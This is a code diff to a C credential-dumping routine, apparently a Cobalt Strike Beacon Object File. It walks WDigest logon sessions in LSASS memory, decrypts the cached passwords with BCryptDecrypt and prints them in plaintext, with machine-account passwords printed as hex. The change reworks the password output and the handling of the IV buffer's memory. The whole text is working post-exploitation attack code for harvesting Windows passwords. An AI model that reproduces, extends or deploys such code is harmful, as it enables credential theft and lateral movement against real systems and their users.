@@ -128,29 +128,35 @@ BOOL DisplayWDigestLogSessListInformation(HANDLE hFile, DWORD64 l_LogSessListHea
                 status = BCryptDecrypt(hKey, cryptoBlob, MaxLengthOfString, 0, ivCopy, 8, bOutput, MaxLengthOfString, &cbResult, 0);
                 if (status == STATUS_SUCCESS)
                 {
-                    char AsciiPasswordString[MAX_PATH];
-                    bytesWritten = WideCharToMultiByte(CP_ACP, 0, (wchar_t*)bOutput, -1, AsciiPasswordString, MAX_PATH, NULL, NULL);
 
                     size_t usernameLength = wcslen(UserNameWideString);
-                    if (usernameLength > 0 && UserNameWideString[usernameLength - 1] == L'$') {
-                        size_t passwordLength = strlen(AsciiPasswordString);
-                        PrintHex(AsciiPasswordString, passwordLength);
-                    }
-                    else if (bytesWritten != 0)
+                    if (usernameLength > 0 && UserNameWideString[usernameLength - 1] == L'$')
                     {
-                        BeaconFormatPrintf(&outputbuffer, "\t    * Password    : %s\n", AsciiPasswordString);
+                        size_t passwordLength = wcslen((wchar_t*)bOutput);
+                        BeaconFormatPrintf(&outputbuffer, "\t    * Password    : ");
+                        PrintHex(bOutput, passwordLength);
                     }
                     else
                     {
-                        BeaconFormatPrintf(&outputbuffer, "\t    * Password    : (Failed to convert to MultiByte string)\n");
+                        char AsciiPasswordString[MAX_PATH];
+                        bytesWritten = WideCharToMultiByte(CP_ACP, 0, (wchar_t*)bOutput, -1, AsciiPasswordString, MAX_PATH, NULL, NULL);
+                        if (bytesWritten != 0)
+                        {
+                            BeaconFormatPrintf(&outputbuffer, "\t    * Password    : %s\n", AsciiPasswordString);
+                        }
+                        else
+                        {
+                            BeaconFormatPrintf(&outputbuffer, "\t    * Password    : (Failed to convert to MultiByte string)\n");
+                        }
                     }
                 }
                 else
                 {
                     BeaconFormatPrintf(&outputbuffer, "[!] Error in BCryptOpenAlgorithmProvider: 0x%lx\n", status);
                 }
-                free(ivCopy);
             }
+            free(ivCopy);
+
             status = BCryptCloseAlgorithmProvider(hAlgorithm, 0);
             status = BCryptDestroyKey(hKey);
             free(bOutput);
